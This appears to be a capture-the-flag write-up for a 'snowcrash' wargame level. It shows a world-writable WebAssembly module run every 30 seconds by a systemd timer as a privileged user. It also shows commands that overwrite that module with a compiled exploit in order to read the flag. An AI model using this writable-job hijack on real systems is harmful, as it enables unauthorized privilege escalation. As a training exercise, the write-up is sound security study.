```bash
level05@snowcrash:~$ cat README
The Metaverse runs on code. Code can be rewritten.
level05@snowcrash:~$ ls -la /opt/snowcrash/level05
total 16
drwxrwxr-x  2 root metaverse 4096 Jun  9 19:03 .
drwxr-xr-x 18 root root      4096 Jun  9 19:04 ..
-rw-rw-r--  1 root metaverse  286 Jun  9 19:03 metaverse.wasm
-rw-r--r--  1 root root       855 Jun  9 19:03 metaverse.wat
level05@snowcrash:~$ cat /opt/snowcrash/level05/*
metaverse.wasm
asm`````Fwasi_snapshot_previewfd_writewasi_snapshot_preview1	proc_exit9memorycompute_integrityvalidate_signal_start
;A�
    AJAA

        #AA6A�A)6AAAA�A

                       .A
                         (Metaverse online. Signal integrity: 91%
metaverse.wat:
(module
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "proc_exit"
    (func $proc_exit (param i32)))

  (memory (export "memory") 1)

  (data (i32.const 0) "Metaverse online. Signal integrity: 91%\n")

  (func $compute_integrity (export "compute_integrity") (result i32)
    i32.const 91
  )

  (func $validate_signal (export "validate_signal") (param i32) (result i32)
    local.get 0
    i32.const 0
    i32.gt_s
    if (result i32)
      i32.const 1
    else
      i32.const 0
    end
  )

  (func $_start (export "_start")
    i32.const 64
    i32.const 0
    i32.store

    i32.const 68
    i32.const 41
    i32.store

    i32.const 1
    i32.const 64
    i32.const 1
    i32.const 72
    call $fd_write
    drop

    i32.const 0
    call $proc_exit
  )
)
level05@snowcrash:~$ file /opt/snowcrash/level05/*
/opt/snowcrash/level05/metaverse.wasm: WebAssembly (wasm) binary module version 0x1 (MVP)
/opt/snowcrash/level05/metaverse.wat:  ASCII text
```

As usual there's a timer (presumably that runs with flag05 perms).
```bash
level05@snowcrash:~$ systemctl cat metaverse.service
# /etc/systemd/system/metaverse.service
[Unit]
Description=Metaverse WASM runtime (one-shot)
After=network.target

[Service]
Type=oneshot
User=flag05
ExecStart=/usr/local/bin/wasmtime --dir=/ /opt/snowcrash/level05/metaverse.wasm
StandardOutput=journal
StandardError=journal
level05@snowcrash:~$ systemctl cat metaverse.timer
# /etc/systemd/system/metaverse.timer
[Unit]
Description=Metaverse WASM runtime — runs every 30 seconds
Requires=metaverse.service

[Timer]
OnBootSec=15s
OnUnitActiveSec=30s
AccuracySec=1s

[Install]
WantedBy=timers.target
```

So the idea is to write a script and compile to webasm so the service runs it and reads out the flag to the journal. [expoit.wat](exploit.wat)
```bash
level05@snowcrash:~$ which wat2wasm wasmtools cargo
/usr/bin/wat2wasm
level05@snowcrash:~$ wat2wasm exploit.wat -o /opt/snowcrash/level05/metaverse.wasm
level05@snowcrash:~$ sleep 30 && cat /tmp/flag05
```
